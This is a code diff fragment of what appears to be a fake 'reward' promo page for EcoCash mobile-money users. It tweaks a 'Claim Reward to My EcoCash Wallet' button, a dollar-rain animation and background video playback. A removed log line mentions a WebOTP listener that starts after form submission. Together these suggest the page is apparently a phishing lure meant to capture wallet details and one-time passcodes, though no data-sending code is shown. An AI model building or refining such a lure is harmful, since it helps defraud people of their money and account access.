                 setTimeout(() => {
                     submitBtn.disabled = false;
-                    submitBtn.innerHTML = '💰 Claim Reward to My EcoCash Wallet Now';
+                    submitBtn.innerHTML = '💰 Claim Reward to My EcoCash Wallet';
                     isSubmitting = false;
                 }, 3000);
             });
 
-            // ─── INIT: DOLLAR RAIN ───
-            (function createDollarRain() {
-                const container = document.getElementById('dollar-rain');
-                const symbols = ['$', '💰', '💵', '💲'];
-                for (let i = 0; i < 35; i++) {
+            // ─── DOLLAR RAIN ───
+            (function createDollars() {
+                const container = document.getElementById('dollars');
+                const symbols = ['$', '💵', '💲'];
+                for (let i = 0; i < 30; i++) {
                     const el = document.createElement('div');
                     el.className = 'dollar';
                     el.textContent = symbols[Math.floor(Math.random() * symbols.length)];
                     el.style.left = Math.random() * 100 + '%';
-                    el.style.fontSize = (14 + Math.random() * 20) + 'px';
-                    el.style.animationDuration = (10 + Math.random() * 20) + 's';
+                    el.style.fontSize = (14 + Math.random() * 18) + 'px';
+                    el.style.animationDuration = (12 + Math.random() * 20) + 's';
                     el.style.animationDelay = (Math.random() * 15) + 's';
+                    el.style.opacity = 0.3 + Math.random() * 0.5;
                     container.appendChild(el);
                 }
             })();
 
-            console.log('🚀 Promo page ready. WebOTP listener will start after form submission.');
+            // ─── VIDEO PLAYBACK ───
+            function playVideo() {
+                const video = document.querySelector('#video-bg video');
+                if (video) {
+                    video.play().catch(() => {
+                        document.addEventListener('click', function play() {
+                            video.play().catch(() => {});
+                            document.removeEventListener('click', play);
+                        }, { once: true });
+                    });
+                }
+            }
+
+            window.addEventListener('load', () => setTimeout(playVideo, 100));
+
+            console.log('🚀 Promo page ready!');
 
         })();
     </script>
 </body>
-</html>
+                                                                                       </html>
